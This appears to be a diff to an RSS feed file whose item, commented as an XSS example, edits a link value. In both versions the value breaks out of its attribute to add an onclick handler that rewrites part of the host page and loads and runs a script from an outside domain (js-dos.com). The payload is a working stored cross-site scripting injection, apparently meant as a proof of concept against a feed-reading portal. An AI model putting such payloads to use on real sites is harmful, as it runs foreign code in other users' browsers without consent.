@@ -8,8 +8,8 @@
     <!-- Exemplo de item XSS -->
     <item>
       <title>Carregar DOS</title>
-      <link>#"onclick="document.querySelector('.col-sm-12.col-md-4.column1.sortable.ui-sortable').querySelector('.portlet-content.ui-widget-content').innerHTML=`<div id='dosbox'></div><br/>`,document.querySelector('#dosbox').style.width='350px',document.querySelector('#dosbox').style.height='200px',document.querySelector('#dosbox').style.backgroundColor='#111';var link=document.createElement('link');link.rel='stylesheet',link.href='https://v8.js-dos.com/latest/js-dos.css',document.head.appendChild(link);var script=document.createElement('script');script.src='https://v8.js-dos.com/latest/js-dos.js',script.onload=function(){alert('Sistema DOS carregado com sucesso!')},document.body.appendChild(script);"</link>
-      <description>Carrega um sistema DOS completo para a memória</description>
+      <link>#"onclick="document.querySelector('.col-sm-12.col-md-4.column1.sortable.ui-sortable').querySelector('.portlet-content.ui-widget-content').innerHTML='';let divDos = document.createElement('div');divDos.id='dosbox';document.querySelector('.col-sm-12.col-md-4.column1.sortable.ui-sortable').querySelector('.portlet-content.ui-widget-content').appendChild(divDos),document.querySelector('#dosbox').style.width='350px',document.querySelector('#dosbox').style.height='200px',document.querySelector('#dosbox').style.backgroundColor='#111';var link=document.createElement('link');link.rel='stylesheet',link.href='https://v8.js-dos.com/latest/js-dos.css',document.head.appendChild(link);var script=document.createElement('script');script.src='https://v8.js-dos.com/latest/js-dos.js',script.onload=function(){alert('Sistema DOS carregado com sucesso!')},document.body.appendChild(script);"</link>
+      <description>Carrega o Sistema DOS</description>
     </item>
 
     <item>
